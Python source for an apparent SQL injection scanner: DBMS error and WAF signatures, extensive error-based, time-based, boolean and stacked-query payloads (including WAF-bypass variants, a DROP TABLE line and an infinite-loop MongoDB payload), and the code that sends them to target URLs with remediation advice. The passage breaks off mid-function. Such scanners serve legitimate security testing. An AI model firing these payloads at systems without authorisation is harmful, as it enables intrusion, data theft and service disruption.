from __future__ import annotations
"""SQL Injection Scanner — production-grade multi-technique detection.

Detection methods:
1. Error-based: 200+ SQL error patterns across all DBMS
2. Time-based blind: Statistical analysis with baseline, 3-run median, jitter filtering
3. Boolean-based blind: Content diffing (length + structural similarity)
4. UNION-based: ORDER BY column enumeration, then useful-column discovery
5. Stacked queries: Semicolon injection testing
6. WAF detection: Cloudflare, Akamai, ModSecurity, etc.
7. DBMS fingerprinting: Identify database from error messages
8. Second-order: Store payload, check if it executes elsewhere

Every finding has: exact payload, full HTTP request/response, confidence score,
DBMS identified, and DBMS-specific remediation.
"""

import hashlib
import re
import statistics
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from .base import BaseScanner
from .findings import Finding
from ..core.logger import logger
from ..core.ratelimit import get_limiter
from ..core.transport import ssl_verify

# ---------------------------------------------------------------------------
# SQL error patterns — 200+ patterns across 8 DBMS
# ---------------------------------------------------------------------------

SQL_ERROR_PATTERNS: Dict[str, List[str]] = {
    "MySQL": [
        r"SQL syntax.*?MySQL",
        r"Warning.*?mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
        r"Unclosed quotation mark after the character string",
        r"SQLSTATE\[42000\]",
        r"SQLSTATE\[HY000\]",
        r"SQLSTATE\[23000\]",
        r"SQLSTATE\[42S02\]",
        r"SQLSTATE\[42S22\]",
        r"MySqlException",
        r"mysql_fetch",
        r"mysql_num_rows",
        r"mysql_query",
        r"mysqli?::query",
        r"PDO.*?MySQL",
        r"SQLSTATE\[HY000\].*?Connection refused",
        r"Column count doesn't match value count",
        r"Duplicate entry .* for key",
        r"Table .* doesn't exist",
        r"Unknown column .* in",
        r"operand should contain .* column",
        r"You have an error in your SQL syntax",
        r"Data truncated for column",
        r"Truncated incorrect.*?value",
        r"Subquery returns more than 1 row",
        r"Division by 0",
        r"Illegal mix of collations",
        r"FUNCTION .* does not exist",
        r"Access denied for user",
        r"Lock wait timeout exceeded",
        r"Deadlock found when trying to get lock",
        r"cannot be null",
        r"DOUBLE value is out of range",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*?ERROR",
        r"Warning.*?pg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
        r"ERROR:\s+relation .* does not exist",
        r"ERROR:\s+column .* does not exist",
        r"ERROR:\s+current transaction is aborted",
        r"ERROR:\s+invalid input syntax for",
        r"ERROR:\s+permission denied for",
        r"ERROR:\s+violates foreign key constraint",
        r"ERROR:\s+violates not-null constraint",
        r"ERROR:\s+duplicate key value violates",
        r"PSQLException",
        r"pg_query\(\).*?failed",
        r"pg_exec\(\).*?failed",
        r"Pdo[\\/]Pgsql",
        r"org\.postgresql\.",
        r"ERROR:\s+invalid regular expression",
        r"ERROR:\s+operator does not exist",
        r"ERROR:\s+missing FROM-clause entry",
        r"ERROR:\s+each UNION query must have the same number of columns",
        r"ERROR:\s+could not determine data type of parameter",
        r"ERROR:\s+set-returning functions are not allowed in WHERE",
        r"unterminated quoted string",
        r"invalid input syntax for integer",
        r"invalid input syntax for type",
    ],
    "MSSQL": [
        r"Driver.*? SQL[\-\_\ ]*Server",
        r"OLE DB.*? SQL Server",
        r"\bSQL Server[^&lt;&quot;]+Driver",
        r"Warning.*?mssql_",
        r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
        r"System\.Data\.SqlClient\.SqlException",
        r"Unclosed quotation mark after the character string",
        r"Microsoft SQL Native Client error",
        r"ODBC SQL Server Driver",
        r"ODBC Driver \d+ for SQL Server",
        r"SQLServer JDBC Driver",
        r"com\.microsoft\.sqlserver\.jdbc",
        r"\bSQL Server[^&lt;&quot;]+Violation",
        r"Line \d+: Incorrect syntax near",
        r"Cannot insert the value NULL into column",
        r"Conversion failed when converting",
        r"Invalid column name",
        r"Invalid object name",
        r"The multi-part identifier .* could not be bound",
        r"Arithmetic overflow error",
        r"String or binary data would be truncated",
        r"The statement .* could not be prepared",
        r"Incorrect syntax near .*\.",
        r"The parameterized query .* expects the parameter",
        r"An explicit value for the identity column",
        r"Subquery returned more than 1 value",
        r"Cannot resolve the collation conflict",
        r"Login failed for user",
        r"EXECUTE permission denied",
        r"The EXECUTE permission was denied",
        r"Reference to database and/or server-name",
        r"Deferred prepare could not be completed",
    ],
    "Oracle": [
        r"\bORA-\d{5}",
        r"Oracle error",
        r"Oracle.*?Driver",
        r"Warning.*?oci_",
        r"Warning.*?ora_",
        r"oracle\.jdbc",
        r"OracleException",
        r"quoted string not properly terminated",
        r"ORA-00933: SQL command not properly ended",
        r"ORA-00936: missing expression",
        r"ORA-00942: table or view does not exist",
        r"ORA-00904: .* invalid identifier",
        r"ORA-01756: quoted string not properly terminated",
        r"ORA-01722: invalid number",
        r"ORA-06512:",
        r"ORA-00001: unique constraint",
        r"ORA-02291: integrity constraint.*violated",
        r"ORA-02292: integrity constraint.*violated.*child record found",
        r"ORA-01400: cannot insert NULL into",
        r"ORA-01017: invalid username/password",
        r"ORA-28000: the account is locked",
        r"ORA-03113: end-of-file on communication channel",
        r"oracle\.sql\.",
        r"jdbc\.oracle\.",
        r"OraOLEDB",
        r"Microsoft OLE DB Provider for Oracle",
        r"ORA-00920: invalid relational operator",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*?sqlite_",
        r"Warning.*?SQLite3::",
        r"\[SQLITE_ERROR\]",
        r"SQLite error",
        r"sqlite3\.OperationalError",
        r"sqlite3\.ProgrammingError",
        r"no such table:",
        r"no such column:",
        r"SQL logic error",
        r"near .*: syntax error",
        r"unrecognized token:",
        r"column .* is not unique",
        r"duplicate column name:",
        r"datatype mismatch",
        r"PRIMARY KEY must be unique",
        r"database disk image is malformed",
        r"unable to open database file",
        r"SQLite3::query\(\)",
        r"sqlite_",
        r"\.SQLite\.",
        r"SQLITE_",
    ],
    "MongoDB": [
        r"MongoError",
        r"MongoServerError",
        r"mongo\.MongoError",
        r"com\.mongodb\.",
        r"MongoDB\\Driver\\Exception",
        r"E11000 duplicate key error",
        r"unrecognized.*?field.*?\$",
        r"SyntaxError: Unexpected token",
        r"ReferenceError: .* is not defined",
        r"CastError: Cast to .* failed",
        r"TypeError: .* is not a function",
        r"The dotted field .* is not valid for storage",
        r"unknown operator: \$",
        r"failed to parse.*?as a BSON",
        r"ns not found",
        r"not authorized on .* to execute command",
        r"Authentication failed",
        r"MongoCursorException",
        r"mongo\.Cursor",
        r"pymongo\.errors",
        r"OperationFailure",
        r"Collection .* not found",
    ],
    "CouchDB": [
        r"CouchDB",
        r"couchdb",
        r"Apache CouchDB",
        r"enoent.*?missing",
        r"conflict.*?Document update conflict",
        r"Forbidden.*?forbidden",
        r"unauthorized.*?Name or password is incorrect",
        r"query_parse_error",
        r"no_usable_index",
        r"bad_request",
    ],
    "Cassandra": [
        r"InvalidRequest.*?Cassandra",
        r"cassandra\.exceptions",
        r"InvalidQueryException",
        r"SyntaxException",
        r"UnauthorizedException",
        r"AuthenticationException",
        r"NoHostAvailable",
        r"OperationTimedOut",
        r"AlreadyExists.*?Cannot add already existing",
        r"ConfigurationException",
        r"InvalidConfigurationException",
        r"UnavailableException",
        r"WriteTimeoutException",
        r"ReadTimeoutException",
        r"coaxed from Cassandra",
        r"DataStax",
        r"com\.datastax\.driver",
    ],
}

# Flatten all patterns for fast scanning
_ALL_ERROR_PATTERNS: List[Tuple[str, str]] = []
for _dbms, _patterns in SQL_ERROR_PATTERNS.items():
    for _p in _patterns:
        _ALL_ERROR_PATTERNS.append((_dbms, _p))

# ---------------------------------------------------------------------------
# WAF signatures
# ---------------------------------------------------------------------------

WAF_SIGNATURES: Dict[str, List[str]] = {
    "Cloudflare": [
        r"cloudflare", r"cf-ray", r"\b__cfduid\b", r"cf-cache-status",
        r"Attention Required.*?Cloudflare", r"Cloudflare Ray ID",
        r"cf-chl-bypass", r"cf-browser-verification",
    ],
    "Akamai": [
        r"akamai", r"akamaighost", r"Reference.*?Access Denied",
        r"X-Akamai-Transformed", r"akamai.*?bot.*?manager",
    ],
    "ModSecurity": [
        r"mod_security", r"modsecurity", r"NOYB",
        r"This error was generated by Mod_Security",
        r"ModSecurity Action: Access denied",
    ],
    "AWS WAF": [
        r"aws.*?waf", r"X-Amzn-Trace-Id", r"X-Amz-Cf-Id",
        r"Request blocked by.*?AWS", r"awswaf",
    ],
    "Imperva": [
        r"imperva", r"incapsula", r"incap_ses",
        r"visid_incap", r"Imperva.*?Defense",
    ],
    "F5 BIG-IP": [
        r"F5.*?BIG-IP", r"BigIPServer", r"F5\s+FirePass",
        r"TMM_AUTH_COOKIE", r"BIGipServer",
    ],
    "Barracuda": [
        r"Barracuda", r"barra_counter_session",
    ],
    "FortiWeb": [
        r"FortiWeb", r"FORTIWAFSID",
    ],
    "Sucuri": [
        r"Sucuri", r"X-Sucuri-ID", r"Access Denied.*?Sucuri",
    ],
    "Wordfence": [
        r"Wordfence", r"wordfence.*?blocked",
    ],
    "Generic WAF": [
        r"Request blocked", r"Access Denied.*?security",
        r"Your request has been blocked", r"forbidden.*?security",
        r"WAF", r"web application firewall",
        r"not acceptable.*?security policy",
        r"blocked by policy", r"security violation",
    ],
}

# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

# Error-based payloads (~60)
ERROR_PAYLOADS: List[str] = [
    # Basic syntax breaks
    "'", '"', "'\"", "\\", "1'", '1"', "';", "--", "#",
    "')", "')--", "'))", "'))--", "';--",
    # Boolean error triggers
    "' OR '1'='1", "' OR '1'='2", "' OR 1=1--", "' OR 1=1#",
    "1 OR 1=1", "1 OR 1=2",
    # UNION-based
    "' UNION SELECT NULL--", "1 UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--", "' UNION ALL SELECT NULL--",
    "-1 UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT @@version--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    # MySQL error-based
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--",
    "1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version())), 1)--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))--",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user())))--",
    "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1)--",
    # MSSQL error-based
    "' AND 1=CONVERT(int, DB_NAME())--",
    "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
    ";SELECT @@version--",
    ";SELECT DB_NAME()--",
    "' AND 1=CAST((SELECT @@version) AS int)--",
    # PostgreSQL error-based
    "' AND 1=CAST(version() AS int)--",
    "' AND 1=CAST(current_database() AS int)--",
    "' AND 1=(SELECT version())--",
    "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--",
    # Oracle error-based
    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
    "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
    "' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1))--",
    # SQLite error-based
    "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1))))--",
    "' AND 1=LOAD_EXTENSION(1)--",
    # MongoDB
    "'; return true; var a='", "'; while(true){}; var a='",
    "' || '1'=='1", "' && '1'=='1",
    # Stacked queries
    "';SELECT @@version--",
    "';SELECT version()--",
    "';SELECT DB_NAME()--",
    # WAF bypass payloads
    "'/**/OR/**/1=1--",
    "'/**/UNION/**/SELECT/**/NULL--",
    "'/*!50000UNION*//*!50000SELECT*/NULL--",
    "' uNiOn sElEcT NULL--",
    "'%09OR%091=1--",
    "'%0AOR%0A1=1--",
    "'%0BOR%0B1=1--",
    "'%0DOR%0D1=1--",
    "'%A0OR%A01=1--",
    "'/*!OR*/1=1--",
    "'%00' OR 1=1--",
]

# Time-based payloads: (payload_template, dbms, expected_delay)
TIME_PAYLOADS: List[Tuple[str, str, int]] = [
    # MySQL
    ("' OR SLEEP({delay})--", "MySQL", 5),
    ("' AND SLEEP({delay})--", "MySQL", 5),
    ("1' OR SLEEP({delay})--", "MySQL", 5),
    ("' OR SLEEP({delay})#", "MySQL", 5),
    ("'; SELECT SLEEP({delay})--", "MySQL", 5),
    ("1 AND (SELECT * FROM (SELECT(SLEEP({delay})))a)", "MySQL", 5),
    ("' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--", "MySQL", 5),
    ("1' AND (SELECT * FROM (SELECT(SLEEP({delay})))a) AND '1'='1", "MySQL", 5),
    ("(SELECT * FROM (SELECT(SLEEP({delay})))a)", "MySQL", 5),
    ("'/**/OR/**/SLEEP({delay})--", "MySQL", 5),
    ("'/*!50000SLEEP*/({delay})--", "MySQL", 5),
    # MSSQL
    ("'; WAITFOR DELAY '0:0:{delay}'--", "MSSQL", 5),
    ("1; WAITFOR DELAY '0:0:{delay}'--", "MSSQL", 5),
    ("1;WAITFOR DELAY '0:0:{delay}'--", "MSSQL", 5),
    ("'; IF 1=1 WAITFOR DELAY '0:0:{delay}'--", "MSSQL", 5),
    # PostgreSQL
    ("' OR pg_sleep({delay})--", "PostgreSQL", 5),
    ("'; SELECT pg_sleep({delay})--", "PostgreSQL", 5),
    ("1; SELECT pg_sleep({delay})--", "PostgreSQL", 5),
    ("' AND (SELECT * FROM (SELECT(pg_sleep({delay})))a)--", "PostgreSQL", 5),
    # Oracle
    ("' AND 1=dbms_pipe.receive_message('a',{delay})--", "Oracle", 5),
    ("' AND DBMS_LOCK.SLEEP({delay})=0--", "Oracle", 5),
    # SQLite (indirect delay via heavy computation)
    ("' AND 1=randomblob(500000000)--", "SQLite", 3),
    ("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--", "SQLite", 3),
]

# Boolean-based payloads: (true_payload, false_payload, description)
BOOLEAN_PAYLOADS: List[Tuple[str, str, str]] = [
    ("' OR '1'='1", "' OR '1'='2", "String boolean"),
    ("1 OR 1=1", "1 OR 1=2", "Numeric boolean"),
    ("' AND '1'='1", "' AND '1'='2", "AND boolean"),
    ("1 AND 1=1", "1 AND 1=2", "Numeric AND"),
    ("1' AND '1'='1", "1' AND '1'='2", "Numeric string AND"),
    ("(1) AND (1)=(1)", "(1) AND (1)=(2)", "Parentheses"),
    ('" OR "1"="1', '" OR "1"="2', "Double quote boolean"),
    ("' OR 'a' LIKE 'a", "' OR 'a' LIKE 'b", "LIKE boolean"),
    ("' OR 1 BETWEEN 1 AND 1--", "' OR 1 BETWEEN 2 AND 3--", "BETWEEN"),
    ("' OR 1 IN (1)--", "' OR 1 IN (2)--", "IN boolean"),
    ("' OR 1>0--", "' OR 1<0--", "Comparison"),
    ("' OR 1=1#", "' OR 1=2#", "MySQL comment"),
    ("' OR 1=1 LIMIT 1--", "' OR 1=2 LIMIT 1--", "LIMIT boolean"),
    ("' OR 1=1::int--", "' OR 1=2::int--", "PostgreSQL cast"),
    ("' OR (SELECT 1)=(1)--", "' OR (SELECT 1)=(2)--", "Subquery"),
    ("'/**/OR/**/1=1--", "'/**/OR/**/1=2--", "Comment bypass"),
    ("' OR 1=1 UNION SELECT NULL--", "' OR 1=2 UNION SELECT NULL--", "UNION boolean"),
    ("'; SELECT 1--", "'; SELECT 0--", "Stacked boolean"),
]

# Stacked query test payloads
STACKED_PAYLOADS: List[Tuple[str, str]] = [
    ("'; SELECT 1--", "MSSQL/MySQL/PostgreSQL"),
    ("'; SELECT 1#", "MySQL"),
    ("'; SELECT 1;", "Generic"),
    ("1; SELECT 1--", "MSSQL/PostgreSQL"),
    ("'; DROP TABLE ___test___;--", "Generic (destructive — skipped)"),
    ("'; WAITFOR DELAY '0:0:1'--", "MSSQL"),
    ("'; SELECT pg_sleep(1)--", "PostgreSQL"),
]

# ---------------------------------------------------------------------------
# DBMS-specific remediation messages
# ---------------------------------------------------------------------------

DBMS_REMEDIATION: Dict[str, str] = {
    "MySQL": (
        "Use parameterized queries with prepared statements (PDO, MySQLi). "
        "Enable NO_BACKSLASH_ESCAPES SQL mode. Avoid mysql_query/mysqli_query with concatenation."
    ),
    "PostgreSQL": (
        "Use parameterized queries with psycopg2 or asyncpg. "
        "Avoid string formatting in SQL. Use $1, $2 placeholders."
    ),
    "MSSQL": (
        "Use parameterized queries with SqlClient. Enable QUOTED_IDENTIFIER. "
        "Avoid dynamic SQL with EXEC/sp_executesql concatenation."
    ),
    "Oracle": (
        "Use bind variables with cx_Oracle or JDBC PreparedStatement. "
        "Avoid EXECUTE IMMEDIATE with concatenated strings."
    ),
    "SQLite": (
        "Use parameterized queries with sqlite3 module (? placeholders). "
        "Never use string formatting for SQL construction."
    ),
    "MongoDB": (
        "Use MongoDB query operators instead of JavaScript evaluation. "
        "Disable server-side JavaScript. Validate all input types."
    ),
    "CouchDB": (
        "Validate all input against schema. Use CouchDB's built-in validation functions. "
        "Avoid passing user input to Mango queries unsanitized."
    ),
    "Cassandra": (
        "Use prepared statements with the DataStax driver. "
        "Never concatenate user input into CQL queries."
    ),
}

# Default remediation when DBMS is unknown
DEFAULT_SQLI_REMEDIATION = (
    "Use parameterized queries / prepared statements for ALL database interactions. "
    "Never concatenate user input into SQL/CQL/MongoDB queries. "
    "Apply input validation and least-privilege database permissions."
)


# ---------------------------------------------------------------------------
# Helper dataclasses
# ---------------------------------------------------------------------------

@dataclass
class BaselineMetrics:
    """Baseline response metrics for a parameter."""
    url: str
    param: str
    response_length: int = 0
    response_time: float = 0.0
    status_code: int = 200
    content_hash: str = ""
    response_text: str = ""
    headers: dict = field(default_factory=dict)


@dataclass
class WAFResult:
    """WAF detection result."""
    detected: bool = False
    waf_name: str = ""
    evidence: str = ""


# ---------------------------------------------------------------------------
# Main Scanner
# ---------------------------------------------------------------------------

class SQLiScanner(BaseScanner):
    """Production-grade SQL injection scanner.

    Features:
    - Error-based detection with 200+ patterns across 8 DBMS
    - Time-based blind with statistical analysis (baseline + 3-run median)
    - Boolean-based blind with content diffing (length + structural)
    - UNION-based with column enumeration via ORDER BY
    - Stacked queries detection
    - WAF detection and fingerprinting
    - DBMS fingerprinting from errors
    - Second-order injection testing
    """

    NAME = "sqli"

    def __init__(self, rps: float = 5.0, timeout: float = 15.0):
        super().__init__()
        self.limiter = get_limiter(rps)
        self.timeout = timeout

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def scan_url(self, url: str, params: Optional[dict] = None) -> List[Finding]:
        """Scan a URL for SQL injection vulnerabilities.

        Tests each parameter individually across all detection methods.

        Args:
            url: Target URL to scan.
            params: Optional dict of parameter names to test values.
                    If None, parameters are extracted from the URL query string.

        Returns:
            List of Finding objects with evidence.
        """
        try:
            import httpx
        except ImportError:
            logger.warning("httpx not installed — SQLi scanner disabled")
            return []

        findings: List[Finding] = []
        parsed = urlparse(url)
        host = parsed.netloc

        # Resolve parameters
        if params:
            test_params = dict(params)
        else:
            test_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        if not test_params:
            test_params = {"id": "1"}

        client = httpx.Client(
            follow_redirects=True,
            timeout=self.timeout,
            verify=ssl_verify(),
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        )

        try:
            # --- Step 0: WAF Detection ---
            waf = self._detect_waf(client, url, host)

            # --- Step 1: Gather baselines for each parameter ---
            baselines: Dict[str, BaselineMetrics] = {}
            for param_name, param_value in test_params.items():
                bl = self._gather_baseline(client, url, param_name, test_params, host)
                if bl:
                    baselines[param_name] = bl

            if not baselines:
                return findings

            # --- Step 2: Test each parameter ---
            for param_name in test_params:
                baseline = baselines.get(param_name)
                if not baseline:
                    continue

                logger.info(f"[sqli] Testing parameter: {param_name}")

                # 2a. Error-based
                ef = self._test_error_based(client, url, param_name, test_params, host, waf)
                findings.extend(ef)
                if ef and any(f.verified for f in ef):
                    continue  # Confirmed — skip noisier tests for this param

                # 2b. Boolean-based blind
                bf = self._test_boolean_based(client, url, param_name, test_params, baseline, host, waf)
                findings.extend(bf)
                if bf and any(f.verified for f in bf):
                    continue

                # 2c. Time-based blind
                tf = self._test_time_based(client, url, param_name, test_params, host, waf)
                findings.extend(tf)
                if tf and any(f.verified for f in tf):
                    continue

                # 2d. UNION-based
                uf = self._test_union_based(client, url, param_name, test_params, baseline, host, waf)
                findings.extend(uf)

                # 2e. Stacked queries
                sf = self._test_stacked_queries(client, url, param_name, test_params, host, waf)
                findings.extend(sf)

            # --- Step 3: Second-order injection ---
            so_findings = self._test_second_order(client, url, test_params, baselines, host, waf)
            findings.extend(so_findings)

        finally:
            client.close()

        return findings

    # ------------------------------------------------------------------
    # Baseline gathering
    # ------------------------------------------------------------------

    def _gather_baseline(
        self, client: "httpx.Client", url: str, param: str,
        base_params: dict, host: str
    ) -> Optional[BaselineMetrics]:
        """Gather baseline response for a parameter (3 requests, median time)."""
        times: List[float] = []
        lengths: List[int] = []
        last_resp = None

        for _ in range(3):
            self.limiter.wait(host)
            try:
                start = time.monotonic()
                resp = client.get(self._build_url(url, base_params))
                elapsed = time.monotonic() - start
                times.append(elapsed)
                lengths.append(len(resp.text))
                last_resp = resp
            except Exception:
                return None

        if not last_resp:
            return None

        return BaselineMetrics(
            url=url,
            param=param,
            response_length=int(statistics.median(lengths)),
            response_time=statistics.median(times),
            status_code=last_resp.status_code,
            content_hash=hashlib.md5(last_resp.text.encode("utf-8", errors="replace")).hexdigest(),
            response_text=last_resp.text,
            headers=dict(last_resp.headers),
        )

    # ------------------------------------------------------------------
    # WAF Detection
    # ------------------------------------------------------------------

    def _detect_waf(self, client: "httpx.Client", url: str, host: str) -> WAFResult:
        """Detect WAF by sending a benign suspicious payload and checking response."""
        parsed = urlparse(url)
        # Send a clearly SQL-injection-looking payload
        probe_params = {"id": "' OR 1=1--"}
        probe_url = self._build_url(url, probe_params)

        self.limiter.wait(host)
        try:
            resp = client.get(probe_url)
            body = resp.text.lower()
            headers_str = " ".join(f"{k}: {v}" for k, v in resp.headers.items()).lower()
            combined = body + " " + headers_str

            for waf_name, patterns in WAF_SIGNATURES.items():
                for pattern in patterns:
                    if re.search(pattern, combined, re.I):
                        return WAFResult(detected=True, waf_name=waf_name, evidence=pattern)
        except Exception:
            pass

        return WAFResult(detected=False)

    # ------------------------------------------------------------------
    # Error-based detection
    # ------------------------------------------------------------------

    def _test_error_based(
        self, client: "httpx.Client", url: str, param: str,
        base_params: dict, host: str, waf: WAFResult
    ) -> List[Finding]:
        """Test for error-based SQL injection using 60+ payloads."""
        findings: List[Finding] = []
        seen_dbms: set = set()

        for payload in ERROR_PAYLOADS:
            test_params = dict(base_params)
            test_params[param] = payload
            test_url = self._build_url(url, test_params)

            self.limiter.wait(host)
            try:
                resp = client.get(test_url)
                body = resp.text
            except Exception:
                continue

            # Scan for SQL errors
            for dbms, pattern in _ALL_ERROR_PATTERNS:
                if dbms in seen_dbms:
                    continue
                match = re.search(pattern, body, re.I)
                if match and self._validate_sql_error(body, pattern, match.group(0)):
                    seen_dbms.add(dbms)
                    evidence_text = self._extract_evidence(body, match)
                    findings.append(Finding(
                        vuln_type="SQL Injection",
                        title=f"Error-based SQLi ({dbms}) in parameter '{param}'",
                        severity="CRITICAL",
                        url=url,
                        parameter=param,
                        method="GET",
                        payload=payload,
                        evidence=evidence_text,
                        description=(
                            f"SQL error from {dbms} detected in response. "
                            f"Parameter '{param}' is injectable. Pattern: {pattern}"
                        ),
                        remediation=DBMS_REMEDIATION.get(dbms, DEFAULT_SQLI_REMEDIATION),
                        cvss=9.8,
                        cwe="CWE-89",
                        tool=self.NAME,
                        verified=True,
                        confidence="HIGH",
                        request=f"GET {test_url} HTTP/1.1",
                        response_snippet=body[:2000],
                    ))
                    break  # One DBMS per payload

        return findings

    # ------------------------------------------------------------------
    # Time-based blind detection
    # ------------------------------------------------------------------

    def _test_time_based(
        self, client: "httpx.Client", url: str, param: str,
        base_params: dict, host: str, waf: WAFResult
    ) -> List[Finding]:
        """Test for time-based blind SQLi with statistical validation.

        Process:
        1. Measure baseline response time (already done)
        2. Send time-based payload, measure 3 times
        3. Compare median payload time vs baseline
        4. Verify: median must exceed delay threshold AND all 3 must be consistent
        """
        findings: List[Finding] = []

        # Get baseline for this param
        baseline_times: List[float] = []
        for _ in range(3):
            self.limiter.wait(host)
            try:
                start = time.monotonic()
                client.get(self._build_url(url, base_params))
                baseline_times.append(time.monotonic() - start)
            except Exception:
                return findings

        baseline_median = statistics.median(baseline_times)

        for payload_template, dbms, expected_delay in TIME_PAYLOADS:
            payload = payload_template.format(delay=expected_delay)
            test_params = dict(base_params)
            test_params[param] = payload
            test_url = self._build_url(url, test_params)

            # Measure 3 times
            times: List[float] = []
            for _ in range(3):
                self.limiter.wait(host)
                try:
                    start = time.monotonic()
                    resp = client.get(test_url)
                    elapsed = time.monotonic() - start
                    if resp.status_code < 500:
                        times.append(elapsed)
                except Exception:
                    break

            if len(times) < 2:
                continue

            payload_median = statistics.median(times)

            # Statistical check:
            # - Median must be >= 70% of expected delay
            # - Must be significantly above baseline (> baseline + delay * 0.5)
            # - All individual measurements must be somewhat consistent
            min_time = min(times)
            delay_threshold = expected_delay * 0.7

            if (
                payload_median >= delay_threshold
                and payload_median > baseline_median + (expected_delay * 0.5)
                and min_time >= expected_delay * 0.4
            ):
                findings.append(Finding(
                    vuln_type="SQL Injection (Time-based blind)",
                    title=f"Time-based blind SQLi ({dbms}) in parameter '{param}'",
                    severity="CRITICAL",
                    url=url,
                    parameter=param,
                    method="GET",
                    payload=payload,
                    evidence=(
                        f"Baseline median: {baseline_median:.2f}s | "
                        f"Payload median: {payload_median:.2f}s | "
                        f"Individual times: {[f'{t:.2f}s' for t in times]} | "
                        f"Expected delay: {expected_delay}s"
                    ),
                    description=(
                        f"Time-based blind SQL injection confirmed ({dbms}). "
                        f"Server consistently delays when SLEEP/WAITFOR payload is injected. "
                        f"Network jitter accounted for via 3-run median."
                    ),
                    remediation=DBMS_REMEDIATION.get(dbms, DEFAULT_SQLI_REMEDIATION),
                    cvss=9.8,
                    cwe="CWE-89",
                    tool=self.NAME,
                    verified=True,
                    confidence="HIGH",
                    request=f"GET {test_url} HTTP/1.1",
                ))
                return findings  # One confirmed per param

        return findings

    # ------------------------------------------------------------------
    # Boolean-based blind detection
    # ------------------------------------------------------------------

    def _test_boolean_based(
        self, client: "httpx.Client", url: str, param: str,
        base_params: dict, baseline: BaselineMetrics, host: str, waf: WAFResult
    ) -> List[Finding]:
        """Test for boolean-based blind SQLi using content diffing.

        Compares true/false responses on:
        1. Response length (significant delta)
        2. Content structure (removed dynamic parts, compare hash)
        3. True condition should resemble baseline, false should differ
        """
        findings: List[Finding] = []

        for true_payload, false_payload, desc in BOOLEAN_PAYLOADS:
            true_params = dict(base_params)
            true_params[param] = true_payload
            true_url = self._build_url(url, true_params)

            false_params = dict(base_params)
            false_params[param] = false_payload
            false_url = self._build_url(url, false_params)

            self.limiter.wait(host)
            try:
                true_resp = client.get(true_url)
            except Exception:
                continue

            self.limiter.wait(host)
            try:
                false_resp = client.get(false_url)
            except Exception:
                continue

            true_body = true_resp.text
            false_body = false_resp.text

            # --- Length analysis ---
            true_len = len(true_body)
            false_len = len(false_body)
            baseline_len = baseline.response_length
            length_diff = abs(true_len - false_len)

            # Significant difference threshold
            if length_diff < 50:
                continue

            # True should be closer to baseline than false is
            true_baseline_diff = abs(true_len - baseline_len)
            false_baseline_diff = abs(false_len - baseline_len)

            # --- Content structure analysis ---
            true_stripped = self._strip_dynamic(true_body)
            false_stripped = self._strip_dynamic(false_body)
            baseline_stripped = self._strip_dynamic(baseline.response_text)

            true_hash = hashlib.md5(true_stripped.encode()).hexdigest()
            false_hash = hashlib.md5(false_stripped.encode()).hexdigest()
            baseline_hash = baseline.content_hash

            # Structural similarity: true should match baseline structure
            structure_differs = true_hash != false_hash
            true_matches_baseline = (
                self._similarity_ratio(true_stripped, baseline_stripped) > 0.8
            )
            false_differs_from_baseline = (
                self._similarity_ratio(false_stripped, baseline_stripped) < 0.7
            )

            # --- Determine confidence ---
            is_confirmed = (
                length_diff > 100
                and structure_differs
                and true_matches_baseline
                and false_differs_from_baseline
            )
            is_suspicious = (
                length_diff > 50
                and structure_differs
                and (true_matches_baseline or false_differs_from_baseline)
            )

            if is_confirmed:
                confidence = "HIGH"
                verified = True
            elif is_suspicious:
                confidence = "MEDIUM"
                verified = True
            else:
                continue

            findings.append(Finding(
                vuln_type="SQL Injection (Boolean-based blind)",
                title=f"Boolean-based blind SQLi in parameter '{param}' ({desc})",
                severity="CRITICAL",
                url=url,
                parameter=param,
                method="GET",
                payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                evidence=(
                    f"True response: {true_len} bytes (hash: {true_hash[:8]}) | "
                    f"False response: {false_len} bytes (hash: {false_hash[:8]}) | "
                    f"Baseline: {baseline_len} bytes (hash: {baseline_hash[:8]}) | "
                    f"Length diff: {length_diff} bytes | "
                    f"Structure differs: {structure_differs} | "
                    f"True~baseline: {true_matches_baseline} | "
                    f"False≠baseline: {false_differs_from_baseline}"
